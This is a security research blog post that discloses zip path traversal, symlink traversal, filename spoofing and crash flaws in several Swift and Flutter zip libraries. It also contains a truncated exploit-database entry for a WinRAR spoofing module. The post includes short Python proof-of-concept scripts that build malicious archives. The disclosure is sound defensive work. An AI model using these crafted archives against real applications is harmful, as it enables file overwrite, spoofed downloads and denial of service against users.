=== Content from blog.ostorlab.co_6e64aa4c_20250111_041649.html ===


mdi-slash-forward
## [Blog](https://blog.ostorlab.co/)

Engineering

Product

Security

Documentation

Changelog

Login

Demo

mdi-menu

Engineering

Product

Security

Documentation

Changelog

Login

Demo

[Security](https://blog.ostorlab.co/category/security.html)

# ZIP Exploitation: Critical Vulnerabilities Found in Popular Zip Libraries in Swift and Flutter

Recent in-depth investigations reveal serious vulnerabilities discovered in widely-used zip packages in Flutter and Swift, posing serious security risks for thousands of developers and applications. Our article delves into the technical aspects of these vulnerabilities, explaining their discovery, implications and mitigation strategies.

#

Author

[Ostorlab Team](https://blog.ostorlab.co/author/ostorlab-team.html)

`Fri 04 August 2023`

mdi-github

mdi-linkedin

mdi-twitter

mdi-youtube

# Introduction

ZIP packages are compressed archives that contain multiple files and directories, allowing developers to conveniently bundle resources, libraries, and other components required for app functionality. While ZIP packages offer efficiency and ease of use, they can also be the source of potential security vulnerabilities that malicious actors can exploit.

This article will delve into the security of zip-handling implementation, showcasing vulnerabilities in popular Zip libraries in the Swift and Dart (Flutter) ecosystems. We will explore the potential risks associated with malicious ZIP packages and the consequences they can have on mobile application security. Furthermore, we will discuss best practices and effective strategies to ensure the robust protection of ZIP packages throughout the development lifecycle.

# Anatomy of ZIP file

ZIP files typically follow this layout:

```
+------------------------------------------------------+
|                  Local File Header                   |
| +----------------------------------------------+     |
| | Local File Header Signature (4 bytes)       |     |
| | Version Needed to Extract (2 bytes)         |     |
| | General Purpose Bit Flag (2 bytes)          |     |
| | Compression Method (2 bytes)                |     |
| | Last Mod Time (2 bytes)                     |     |
| | Last Mod Date (2 bytes)                     |     |
| | CRC-32 Checksum (4 bytes)                   |     |
| | Compressed Size (4 bytes)                   |     |
| | Uncompressed Size (4 bytes)                 |     |
| | Filename Length (2 bytes)                  |     |
| | Extra Field Length (2 bytes)               |     |
| +----------------------------------------------+     |
| | Filename (variable length)                         | |
| |                                                  | |
| +----------------------------------------------+     |
| | Extra Field (variable length)                      | |
| |                                                  | |
| +----------------------------------------------+     |
|               Compressed Data                          |
|                                                      |
| +----------------------------------------------+     |
| | Data Descriptor (optional)                        | |
| | +------------------------------------------+ |     |
| | | CRC-32 Checksum (4 bytes)                | |     |
| | | Compressed Size (4 bytes)                | |     |
| | | Uncompressed Size (4 bytes)              | |     |
| | +------------------------------------------+ |     |
| +----------------------------------------------+     |
+------------------------------------------------------+
+------------------------------------------------------+
|                Central Directory                      |
| +----------------------------------------------+     |
| | Central Directory File Header              |     |
| | +--------------------------------------+ |     |
| | | Central Directory Header Signature  | |     |
| | | Version Made by (2 bytes)            | |     |
| | | Version Needed to Extract (2 bytes)  | |     |
| | | General Purpose Bit Flag (2 bytes)   | |     |
| | | ...                                | |     |
| | +--------------------------------------+ |     |
| | | CRC-32 Checksum (4 bytes)            | |     |
| | | Compressed Size (4 bytes)            | |     |
| | | Uncompressed Size (4 bytes)          | |     |
| | | Filename Length (2 bytes)            | |     |
| | | ...                                | |     |
| | +--------------------------------------+ |     |
| | | Filename (variable length)           | |     |
| | |                                    | |     |
| | +--------------------------------------+ |     |
| +----------------------------------------------+     |
+------------------------------------------------------+
+------------------------------------------------------+
|       End of Central Directory Record                |
| +----------------------------------------------+     |
| | End of Central Directory Signature (4 bytes) |     |
| | ...                                        |     |
| +----------------------------------------------+     |
+------------------------------------------------------+

```

Notable parts of the zip structure are:

* **Local File Header:** The Local File Header is a section at the beginning of each file within a ZIP archive. It contains essential information about the compressed file, such as its name, size, compression method, and other attributes. This header allows the software to locate and extract individual files from the ZIP archive.
* **Data Descriptor:** The Data Descriptor is an optional section within the ZIP file format. It provides additional information about a file's compressed data. The purpose of the Data Descriptor is to store the CRC-32 checksum of the uncompressed data, the compressed size, and the uncompressed size. Including this information allows for integrity checks and can be useful when extracting files.
* **Central Directory File Header:** The Central Directory File Header is a section in a ZIP file that contains metadata about each file within the archive. It provides details such as the file name, compressed size, uncompressed size, compression method, and other attributes. The Central Directory File Header is located in the central directory structure, a catalog of all the files in the ZIP archive.
* **End of Central Directory Record (EOCD):** The End of Central Directory (EOCD) Record is a section at the end of a ZIP file that marks the end of the central directory structure. It contains essential information, including the number of entries in the central directory, the size of the central directory, and the offset to the start of the central directory. The EOCD record allows the software to locate and access the central directory, which provides information about the files in the ZIP archive.

# Common ZIP vulnerabilities:

* **ZIP path traversal**: Zip path traversal, also known as Zip Slip, is a security vulnerability that occurs when the application fails to validate zip entries' file names during extraction. It allows an attacker to extract files to arbitrary locations outside the extraction directory, which helps overwrite sensitive user data and, in some cases, can lead to code execution if an attacker overwrites an application's shared object file.
* **ZIP filename spoofing**: In the context of ZIP archives, there are two main data structures relevant to file names: the `Central Directory Entry` and the `Local File Header`, if a parser for example, reads the filename from `Local File Header` but then proceeds to extract the file with the path in the `Central Directory Entry`.
* **ZIP symlink path traversal**: ZIP symlink is a feature used in many zip utilities that allows those symlinks to point to files outside the extraction directory. This can pose a security risk, leading to overwriting sensitive data or shared object files, which might lead to code execution.
* **ZIP Bomb**: A zip bomb is a small-sized zip file that contains an enormous amount of compressed data. When extracted, it expands into a huge file or consumes excessive system resources, potentially causing denial-of-service (DoS).

# ZIP packages to analyze

## Archive

One of the popular flutter packages for handling compressed files is `archive` by Brendan Duncan, this package implements popular archive formats natively in Dart without having to go through the native platform-specific packages like `java.util.zip` for android or `ZIPFoundation` for iOS.

Language: **Dart (Flutter)**

Link: <https://pub.dev/packages/archive>

## Flutter\_archive

`flutter_archive` is another Flutter package for compressed files that work exclusively with zip files, this package relies on Java's native zip package `java.util.zip` by leveraging Flutter's `MethodChannel`.

Language: **Dart (Flutter)**

Link: <https://pub.dev/packages/flutter_archive>

## ZIPFoundation

`ZIPFoundation` is a library to create, read and modify ZIP archive files. It is written in Swift and based on Apple's libcompression for high performance and energy efficiency.

Language: **Swift**

Link: <https://github.com/weichsel/ZIPFoundation>

## ZIP

`Zip` is a Swift framework for zipping and unzipping files. Simple and quick to use. Built on top of minizip.

Language: **Swift**

Link: <https://github.com/marmelroy/Zip>

## ZIPArchive (SSZIPArchive)

ZipArchive is a simple utility class for zipping and unzipping files on iOS, macOS and tvOS.

Language: **Swift**

Link: <https://github.com/ZipArchive/ZipArchive>

# Detected vulnerabilities

## Package: [Archive](https://github.com/brendan-duncan/archive)

### ZIP filename spoofing (CVE-2023-39137)

`archive` package only parses the filename from the `Local File Header`, this leads to inconsistency with most zip parsers who typically favor `Central Directory Entry`, this inconsistency can be abused by attackers who can craft a malicious zip file with different file names in `Local File Header` and `Central Directory Entry`, consequently having a file with different filenames before and after extraction.

```
  String filename = '';
  List<int> extraField = [];
  String fileComment = '';
  ZipFile? file;

  ZipFileHeader(
      [InputStreamBase? input, InputStreamBase? bytes, String? password]) {
    if (input != null) {
      versionMadeBy = input.readUint16();
      versionNeededToExtract = input.readUint16();
      generalPurposeBitFlag = input.readUint16();
      compressionMethod = input.readUint16();
      lastModifiedFileTime = input.readUint16();
      lastModifiedFileDate = input.readUint16();
      crc32 = input.readUint32();
      compressedSize = input.readUint32();
      uncompressedSize = input.readUint32();
      final fnameLen = input.readUint16();
      final extraLen = input.readUint16();
      final commentLen = input.readUint16();
      diskNumberStart = input.readUint16();
      internalFileAttributes = input.readUint16();
      externalFileAttributes = input.readUint32();
      localHeaderOffset = input.readUint32();

      if (fnameLen > 0) {
        filename = input.readString(size: fnameLen);
      }

```

To test this, we crafted a zip file with different filename field values *evil.apk* and *evil.txt* respectively for `Local File Header` and `Central Directory Entry`

**Proof of concept code:**

```
import zipfile

def generate_spoofed_zip(filename):
    with zipfile.ZipFile('payload.zip', 'w') as zipf:
        zipf.writestr(filename, "Test payload")

    with open('payload.zip', 'rb') as zipf:
        zip_data = zipf.read()
        spoofed_data = zip_data.replace(bytes(filename, 'utf-8'), bytes(spoofed_filename, 'utf-8'), 1)

    with open('payload.zip', 'wb') as zipf:
        zipf.write(spoofed_data)

original_filename = 'evil.txt'
spoofed_filename = 'evil.apk'

if len(original_filename) != len(spoofed_filename):
    raise ValueError("Filenames lengths must be equal")

generate_spoofed_zip(original_filename)

```

![zip file hexdump](https://blog.ostorlab.co/static/img/archive_zip/zipfile_hexdump.png "Zip file hex dump")

Zip file hex dump

when we ran `zipinfo` utility over our zip file, the filename inside was parsed as `evil.txt`

![zipinfo](https://blog.ostorlab.co/static/img/archive_zip/zipinfo.png "zipinfo over our zip file")

zipinfo over our zip file

However, after extracting the file using `extractFileToDisk` function from `archive` package, the filename was parsed as `evil.apk`

![zip file extracted](https://blog.ostorlab.co/static/img/archive_zip/extracted_zipfile.png "Extracted zip file")

Extracted zip file

### ZIP symlink path traversal (CVE-2023-39139)

Another interesting finding we found while inspecting the package was not only it links symlinks back after extraction, it also links ones pointing to any path, even outside the extraction directory.

```
  for (final file in archive.files) {
    final filePath = p.join(outputPath, p.normalize(file.name));

    if (!isWithinOutputPath(outputPath, filePath)) {
      continue;
    }

    if (!file.isFile && !file.isSymbolicLink) {
      Directory(filePath).createSync(recursive: true);
      continue;
    }

    if (asyncWrite) {
      if (file.isSymbolicLink) {
        final link = Link(filePath);
        await link.create(p.normalize(file.nameOfLinkedFile), recursive: true);
      } else {
        final output = File(filePath);
        final f = await output.create(recursive: true);
        final fp = await f.open(mode: FileMode.write);
        final bytes = file.content as List<int>;
        await fp.writeFrom(bytes);
        file.clear();
        futures.add(fp.close());
      }

```

To test that we created a symlink *evil* pointing to a file (*secret.txt*) in the parent directory, we zipped that symlink using the command `zip --symlinks poc.zip evil` and extracted `poc.zip` on an Android test device using `extractFileToDisk` function.

**Proof of concept code:**

```
import zipfile

def compress_file(filename):
    zipInfo = zipfile.ZipInfo(".")
    zipInfo.create_system = 3
    zipInfo.external_attr = 2716663808
    zipInfo.filename = filename

    with zipfile.ZipFile('payload.zip', 'w') as zipf:
        zipf.writestr(zipInfo, "/etc/hosts")

filename = 'evil'

compress_file(filename)

```

![symlink workstation](https://blog.ostorlab.co/static/img/archive_zip/symlink_workstation.png "Symlink poc in our workstation")

Symlink poc in our workstation

Upon extracting the zip file, the symlink was linked back and pointing to `../secret.txt`, outside the extraction directory.

![symlink android](https://blog.ostorlab.co/static/img/archive_zip/symlink_android.png "Symlink after extraction on android device")

Symlink after extraction on android device

## Package: [ZIPFoundation](https://github.com/weichsel/ZIPFoundation)

### ZIP symlink path traversal (CVE-2023-39138)

Upon extraction, the package passes the path coming from the zip entry directly to `fileManager.createSymbolicLink` without checking that it is located within extraction directory, we replicated the same test above and found this package too allows symlinks pointing outside the extraction directory.

```
case .symlink:
    guard !fileManager.itemExists(at: url) else {
        throw CocoaError(.fileWriteFileExists, userInfo: [NSFilePathErrorKey: url.path])
    }
    let consumer = { (data: Data) in
        guard let linkPath = String(data: data, encoding: .utf8) else { throw ArchiveError.invalidEntryPath }
        try fileManager.createParentDirectoryStructure(for: url)
        try fileManager.createSymbolicLink(atPath: url.path, withDestinationPath: linkPath)
    }
    checksum = try self.extract(entry, bufferSize: bufferSize, skipCRC32: skipCRC32,
                                progress: progress, consumer: consumer)
}

```
### ZIP path traversal (CVE-2023-39138)

the package uses the function `isContained` to check that the zip entry path is located within the extraction directory:

```
func isContained(in parentDirectoryURL: URL) -> Bool {
        // Ensure this URL is contained in the passed in URL
        let parentDirectoryURL = URL(fileURLWithPath: parentDirectoryURL.path, isDirectory: true).standardized
        return self.standardized.absoluteString.hasPrefix(parentDirectoryURL.absoluteString)
    }
...
guard entryURL.isContained(in: destinationURL) else {
        throw CocoaError(.fileReadInvalidFileName,
                         userInfo: [NSFilePathErrorKey: entryURL.path])
    }
...
crc32 = try archive.extract(entry, to: entryURL, skipCRC32: skipCRC32, progress: entryProgress)

```

Below is a code snippet of the `extract` function:

```
public func extract(_ entry: Entry, to url: URL, bufferSize: Int = defaultReadChunkSize, skipCRC32: Bool = false,
                        progress: Progress? = nil) throws -> CRC32 {
        guard bufferSize > 0 else {
            throw ArchiveError.invalidBufferSize
        }
        let fileManager = FileManager()
        var checksum = CRC32(0)
        switch entry.type {
        case .file:
            guard !fileManager.itemExists(at: url) else {
                throw CocoaError(.fileWriteFileExists, userInfo: [NSFilePathErrorKey: url.path])
            }
            try fileManager.createParentDirectoryStructure(for: url)
            let destinationRepresentation = fileManager.fileSystemRepresentation(withPath: url.path)
            guard let destinationFile: FILEPointer = fopen(destinationRepresentation, "wb+") else {
                throw POSIXError(errno, path: url.path)
            }
            defer { fclose(destinationFile) }
            let consumer = { _ = try Data.write(chunk: $0, to: destinationFile) }
            checksum = try self.extract(entry, bufferSize: bufferSize, skipCRC32: skipCRC32,
                                        progress: progress, consumer: consumer)

```

When provided with the following path `/base_path/extraction_directory//../` the path gets normalized to `/base_path/extraction_directory/entry_file_name` which passes the check above.
When that same path is passed to `fopen`, it gets normalized to `/base_path/entry_file_name`, allowing us to write files outside the extraction directory.

**Proof of concept code:**

```
import zipfile

def compress_file(filename):
    with zipfile.ZipFile('payload.zip', 'w') as zipf:
        zipf.writestr(filename, "Test payload")

filename = '/../secret.txt'

compress_file(filename)

```
## Package: [Zip](https://github.com/marmelroy/Zip)

### ZIP path traversal (CVE-2023-39135)

Below is a code snippet from the `unzipFile` function used to extract zip files, you can notice that `pathString` coming from our zip entry is appended to the `destination` directory without any sanitization

```
let fileNameSize = Int(fileInfo.size_filename) + 1
//let fileName = UnsafeMutablePointer<CChar>(allocatingCapacity: fileNameSize)
let fileName = UnsafeMutablePointer<CChar>.allocate(capacity: fileNameSize)

unzGetCurrentFileInfo64(zip, &fileInfo, fileName, UInt(fileNameSize), nil, 0, nil, 0)
fileName[Int(fileInfo.size_filename)] = 0

var pathString = String(cString: fileName)

guard pathString.count > 0 else {
    throw ZipError.unzipFail
}

var isDirectory = false
let fileInfoSizeFileName = Int(fileInfo.size_filename-1)
if (fileName[fileInfoSizeFileName] == "/".cString(using: String.Encoding.utf8)?.first || fileName[fileInfoSizeFileName] == "\\".cString(using: String.Encoding.utf8)?.first) {
    isDirectory = true;
}
free(fileName)
if pathString.rangeOfCharacter(from: CharacterSet(charactersIn: "/\\")) != nil {
    pathString = pathString.replacingOccurrences(of: "\\", with: "/")
}

let fullPath = destination.appendingPathComponent(pathString).path

```

**Proof of concept code:**

```
import zipfile

def compress_file(filename):
    with zipfile.ZipFile('payload.zip', 'w') as zipf:
        zipf.writestr(filename, "Test payload")

filename = '../secret.txt'

compress_file(filename)

```
## Package: [ZIPArchive (SSZIPArchive)](https://github.com/ZipArchive/ZipArchive)

### Denial of Service (CVE-2023-39136)

Below is a code snippet from the `_sanitizedPath` function used to sanitize zip entries filenames, the code prepends `file:///` prefix to the zip entry path, standardizes it using `NSURL` then removes the prepended prefix, however when presented with `/..` as a path, the output of `NSURL` becomes `file://`, which has 7 characters while the code expects at least 8 characters, this unhandled edge case leads to crashing the application.

```
if (strPath == nil) {
        return nil;
    }

// Add scheme "file:///" to support sanitation on names with a colon like "file:a/../../../usr/bin"
strPath = [@"file:///" stringByAppendingString:strPath];

// Sanitize path traversal characters to prevent directory backtracking. Ignoring these characters mimics the default behavior of the Unarchiving tool on macOS.
// "../../../../../../../../../../../tmp/test.txt" -> "tmp/test.txt"
// "a/b/../c.txt" -> "a/c.txt"
strPath = [NSURL URLWithString:strPath].standardizedURL.absoluteString;

// Remove the "file:///" scheme
strPath = [strPath substringFromIndex:8];

```

**Proof of concept code:**

```
import zipfile

def compress_file(filename):
    with zipfile.ZipFile('payload.zip', 'w') as zipf:
        zipf.writestr(filename, "Test payload")

filename = '/..'

compress_file(filename)

```
# Summary table

| Package | Language | ZIP Filename Spoofing | ZIP Symlink | ZIP Path Traversal | Denial of Service |
| --- | --- | --- | --- | --- | --- |
| Archive | Dart (Flutter) | Vulnerable | Not Vulnerable | Not Vulnerable | Not Vulnerable |
| Flutter\_archive | Dart (Flutter) | Not Vulnerable | Not Vulnerable | Not Vulnerable | Not Vulnerable |
| ZIPFoundation | Swift | Not Vulnerable | Vulnerable | Vulnerable | Not Vulnerable |
| ZIP | Swift | Not Vulnerable | Not Vulnerable | Vulnerable | Not Vulnerable |
| ZIPArchive | Swift | Not Vulnerable | Not Vulnerable | Not Vulnerable | Vulnerable |

# Conclusion

In conclusion, ZIP vulnerabilities pose significant security risks that developers should be aware of when handling archive files. The ZIP file format, although widely used and supported, is not immune to exploitation. Understanding and addressing these vulnerabilities is essential to safeguarding sensitive data and preventing potential attacks.

This article has highlighted several common ZIP vulnerabilities, including ZIP path traversal, ZIP filename spoofing, ZIP symlink vulnerability, and ZIP bomb attacks. Each of these vulnerabilities exposes different risks, such as unauthorized access to files, overwriting sensitive data, denial-of-service (DoS) and even code execution in some scenarios.

It is important for developers to implement robust security measures when working with ZIP files. This includes validating zip entry file names during extraction to prevent path traversal attacks, ensuring consistency between the filenames in the Local File Header and Central Directory Entry to mitigate filename spoofing, restricting access permissions for extracted files, and implementing proper decompression techniques to prevent DoS situations caused by ZIP bombs.

Additionally, it is crucial to stay informed about security updates and patches related to ZIP libraries or packages used in development frameworks. Regularly reviewing and updating these dependencies can help mitigate known vulnerabilities and protect against emerging threats.

It is worth mentioning that the issues discussed in this article were reported to the concerned authors.

Tags:

[flutter](https://blog.ostorlab.co/tag/flutter.html),  [swift](https://blog.ostorlab.co/tag/swift.html),  [zip](https://blog.ostorlab.co/tag/zip.html),  [security](https://blog.ostorlab.co/tag/security.html),  [archive](https://blog.ostorlab.co/tag/archive.html),  [vulnerability](https://blog.ostorlab.co/tag/vulnerability.html),  [exploitation](https://blog.ostorlab.co/tag/exploitation.html)

We do newsletters, too

---

Get the latest news, updates, and product innovations from Ostorlab right in your inbox.

Subscribe

Table of Contents

---

* [Introduction](#introduction "Introduction")
* [Anatomy of ZIP file](#anatomy of zip file "Anatomy of ZIP file")
* [Common ZIP vulnerabilities:](#common zip vulnerabilities: "Common ZIP vulnerabilities:")
* [ZIP packages to analyze](#zip packages to analyze "ZIP packages to analyze")
  + [Archive](#archive "Archive")
  + [Flutter\_archive](#flutter_archive "Flutter_archive")
  + [ZIPFoundation](#zipfoundation "ZIPFoundation")
  + [ZIP](#zip "ZIP")
  + [ZIPArchive (SSZIPArchive)](#ziparchive (ssziparchive) "ZIPArchive (SSZIPArchive)")
* [Detected vulnerabilities](#detected vulnerabilities_1 "Detected vulnerabilities")
  + [Package: Archive](#package: archive "Package: Archive")
    - [ZIP filename spoofing (CVE-2023-39137)](#zip filename spoofing (cve-2023-39137) "ZIP filename spoofing (CVE-2023-39137)")
    - [ZIP symlink path traversal (CVE-2023-39139)](#zip symlink path traversal (cve-2023-39139) "ZIP symlink path traversal (CVE-2023-39139)")
  + [Package: ZIPFoundation](#package: zipfoundation_1 "Package: ZIPFoundation")
    - [ZIP symlink path traversal (CVE-2023-39138)](#zip symlink path traversal (cve-2023-39138) "ZIP symlink path traversal (CVE-2023-39138)")
    - [ZIP path traversal (CVE-2023-39138)](#zip path traversal (cve-2023-39138) "ZIP path traversal (CVE-2023-39138)")
  + [Package: Zip](#package: zip_1 "Package: Zip")
    - [ZIP path traversal (CVE-2023-39135)](#zip path traversal (cve-2023-39135) "ZIP path traversal (CVE-2023-39135)")
  + [Package: ZIPArchive (SSZIPArchive)](#package: ziparchive (ssziparchive)_1 "Package: ZIPArchive (SSZIPArchive)")
    - [Denial of Service (CVE-2023-39136)](#denial of service (cve-2023-39136) "Denial of Service (CVE-2023-39136)")
* [Summary table](#summary table_2 "Summary table")
* [Conclusion](#conclusion "Conclusion")

## Subscribe to the Ostorlab Newsletter

A newsletter covering techniques, technical guides, and the latest product innovations coming from Ostorlab.

Subscribe
>

Questions, comments, feedback, or just a quick hello, you know where to reach us 😉!

mdi-at

contact@ostorlab.co

Platform

[Lighthouse](https://ostorlab.co/appcards)

[Vulnerability Database](https://ostorlab.co/vulndb)

[Changelog](https://blog.ostorlab.co/changelog.html)

[FAQ](https://docs.ostorlab.co/faq/)

Product

[Mobile Security Testing](https://ostorlab.co/product/mobile)

[Web Security Testing](https://ostorlab.co/product/web)

[Attack Surface Discovery](https://ostorlab.co/product/attacksurface)

[Open-Source](https://oxo.ostorlab.co/)

Company

[Documentation](https://docs.ostorlab.co)

[Plans](https://ostorlab.co/plans)

[Contact](https://ostorlab.co/contact)

mdi-copyright

`2024 Ostorlab. All Rights
Reserved.`

[`Terms
& Conditions`](https://docs.ostorlab.co/terms/)
[`Privacy
Policy`](https://docs.ostorlab.co/privacy/)

mdi-rss-box

mdi-atom

mdi-github

mdi-linkedin

mdi-instagram

mdi-twitter

mdi-youtube



=== Content from www.rapid7.com_589d2990_20250111_041651.html ===


[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)
* en
  + English
  + [日本語](/ja/db/modules/)
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg) Sign In](https://insight.rapid7.com/saml/SSO)
[Contact us](/contact/)[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)

* en
  + English
  + [日本語](/ja/db/modules/)
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg)Sign In](https://insight.rapid7.com/saml/SSO)
[![Rapid7 logo](/Areas/Docs/includes/img/r7-nav/Rapid7_logo-short.svg)](https://www.rapid7.com/)

[Contact us](/contact/)

* [Home](/)
* [Vulnerability & Exploit Database](/db/)
* **Modules**

#### Rapid7 Vulnerability & Exploit Database

# WinRAR Filename Spoofing

 [Back to Search](https://www.rapid7.com/db/)

### WinRAR Filename Spoofing

Disclosed
09/28/2009

Created
05/30/2018

#### Description

This module abuses a filename spoofing vulnerability in WinRAR. The vulnerability exists
when opening ZIP files. The file names showed in WinRAR when opening a ZIP file come from
